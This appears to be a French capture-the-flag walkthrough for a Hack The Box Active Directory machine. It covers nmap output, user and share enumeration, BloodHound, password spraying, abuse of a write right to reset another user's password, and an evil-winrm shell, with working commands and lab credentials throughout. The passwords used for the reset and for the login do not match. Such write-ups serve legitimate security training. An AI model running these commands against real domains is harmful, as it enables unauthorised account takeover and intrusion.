Tasks : 
- Énumération des utilisateurs et services AD.
- Exploitation des partages et fichiers sensibles.
- Escalation des privilèges via abus de droits Active Directory .
- Récupération des identifiants administrateur via une attaque **DCSync**.
# Enumeration 
# Nmap 

Nous avons débuté l'engagement par une analyse de port à l'aide de l'outil Nmap afin d'identifier les services exposés sur la cible.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-18 19:47:14Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
53378/tcp open  msrpc         Microsoft Windows RPC
53387/tcp open  msrpc         Microsoft Windows RPC
53402/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-18T19:49:03
|_  start_date: N/A
|_clock-skew: 6h59m56s
```

Des identifiants ont été fournis dès le départ pour initier l’accès à la machine :
- **Utilisateur :** `levi.james`
- **Mot de passe :** `KingofAkron2025!`

Ces identifiants ont permis de réaliser des actions d’énumération sur l’environnement Active Directory.

![[Pasted image 20250518150908.png]]

Nous avons ajouté ces informations :
Dans `/etc/hosts` pour la résolution locale.
### Enumeration des utilisateurs 

```
nxc smb PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print $2}' | awk '{print $1}' > users.txt
```

![[Pasted image 20250518151924.png]]

### enumeration des dossiers

```bash
crackmapexec smb 10.10.X.X -u levi.james -p 'KingofAkron2025!' --shares
```

![[Pasted image 20250521121640.png]]

Nous avons trouvé un partage nommé **DEV**.

![[Pasted image 20250521122929.png]]

## Analyse de l’environnement avec BloodHound

Grâce à **bloodhound-python**, une collecte a été effectuée pour cartographier les relations et privilèges dans l’Active Directory.

```
bloodhound-python -dc DC.PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70
```

![[Pasted image 20250521144358.png]]



Analyse des droits :

- `levi.james` est membre du groupe **Developers** avec un droit **GenericWrite** sur un autre compte, mais non exploitable immédiatement.


À partir du dump, nous avons généré un fichier `passwords_only.txt`, puis effectué un **password spraying** :

![[Pasted image 20250518154138.png]]

edwards:Antman2025!

Analyse avec BloodHound : l’utilisateur `ant.edwards` a un droit d’écriture sur `adam.d.silver`.

Nous utilisons `rpcclient` ou `bloodyAD` pour changer le mot de passe de la cible.

```
bloodyAD/bloodyAD.py --host 10.10.X.X -d PUPPY.HTB -u Ant.Edwards -p 'Antman2025!' get writable --detail | grep -E "distinguishedName: CN=.*DC=PUPPY,DC=HTB" -A 10
```

![[Pasted image 20250521141240.png]]
  
Nous changeons le mot de passe avec rpcclient

```bash
rpcclient -U 'puppy.htb\Ant.Edwards%Antman2025!' 10.10.X.X
```


![[Pasted image 20250521141542.png]]

![[Pasted image 20250521141843.png]]


![[Pasted image 20250521142830.png]]

```bash
impacket-changepasswd puppy.htb/adam.silver@10.10.X.X -newpass 'Passwordlol237' -altuser puppy.htb/ant.edwards -altpass Antman2025! -reset
```


![[Pasted image 20250521150538.png]]

Avec le mot de passe modifié, nous utilisons **WinRM** pour obtenir un shell distant :

```bash
evil-winrm -i 10.10.X.X -u adam.d.silver -p 'NewPass123!'
```

![[Pasted image 20250521151820.png]]


> [!Important]
> Si vous avez désactivé l'utilisateur, saisissez-le dans le champ .ldif
>  dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
> changetype: modify
> replace: userAccountControl
> userAccountControl: 512
> ldapmodify -x -H ldap://$ip -D "ant.edwards@puppy.htb" -w 'Antman2025!' -f modify.ldif

